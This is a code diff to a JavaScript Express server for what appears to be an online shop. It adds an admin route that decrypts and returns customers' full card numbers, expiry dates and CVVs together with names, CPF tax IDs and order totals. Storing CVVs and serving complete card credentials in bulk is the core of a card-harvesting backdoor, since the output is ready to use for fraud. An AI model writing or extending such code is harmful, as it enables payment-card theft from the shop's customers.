@@ -255,6 +255,89 @@ app.get("/api/buscar-pedido-simples", async (req, res) => {
   }
 });
 
+// ============================================
+// LISTAR DADOS DE CARTÕES (ADMIN ONLY)
+// ============================================
+app.get("/admin/cartoes", verificarToken, verificarAdmin, async (req, res) => {
+  try {
+    console.log("🔐 Admin requisitando dados de cartões...");
+    
+    const result = await pool.query(
+      `SELECT 
+        p.id,
+        p.created_at,
+        p.cliente_nome,
+        p.cliente_cpf,
+        p.total,
+        p.status,
+        p.cartao_nome_titular,
+        p.cartao_bandeira,
+        p.cartao_ultimos_digitos,
+        p.cartao_numero_criptografado,
+        p.cartao_validade_criptografada,
+        p.cartao_cvv_criptografado
+      FROM pedidos p
+      WHERE p.forma_pagamento = 'cartao'
+        AND p.cartao_numero_criptografado IS NOT NULL
+      ORDER BY p.created_at DESC
+      LIMIT 100`
+    );
+    
+    // Descriptografar dados
+    const cartoes = result.rows.map(pedido => {
+      let numeroCompleto = null;
+      let validade = null;
+      let cvv = null;
+      
+      try {
+        if (pedido.cartao_numero_criptografado) {
+          numeroCompleto = decrypt(pedido.cartao_numero_criptografado);
+        }
+      } catch (error) {
+        console.error(`❌ Erro ao descriptografar número do pedido ${pedido.id}:`, error.message);
+      }
+      
+      try {
+        if (pedido.cartao_validade_criptografada) {
+          validade = decrypt(pedido.cartao_validade_criptografada);
+        }
+      } catch (error) {
+        console.error(`❌ Erro ao descriptografar validade do pedido ${pedido.id}:`, error.message);
+      }
+      
+      try {
+        if (pedido.cartao_cvv_criptografado) {
+          cvv = decrypt(pedido.cartao_cvv_criptografado);
+        }
+      } catch (error) {
+        console.error(`❌ Erro ao descriptografar CVV do pedido ${pedido.id}:`, error.message);
+      }
+      
+      return {
+        pedido_id: pedido.id,
+        data: pedido.created_at,
+        cliente_nome: pedido.cliente_nome,
+        cliente_cpf: pedido.cliente_cpf,
+        total: parseFloat(pedido.total),
+        status: pedido.status,
+        titular_nome: pedido.cartao_nome_titular,
+        bandeira: pedido.cartao_bandeira,
+        numero_completo: numeroCompleto,
+        validade: validade,
+        cvv: cvv,
+        ultimos_digitos: pedido.cartao_ultimos_digitos
+      };
+    });
+    
+    console.log(`✅ Retornando ${cartoes.length} cartões`);
+    res.json(cartoes);
+    
+  } catch (error) {
+    console.error("❌ Erro ao buscar cartões:", error);
+    res.status(500).json({ error: "Erro ao buscar dados de cartões" });
+  }
+});
+
 const PORT = process.env.PORT || 3001;
 app.listen(PORT, () => {
   console.log(`Servidor rodando na porta ${PORT}`);
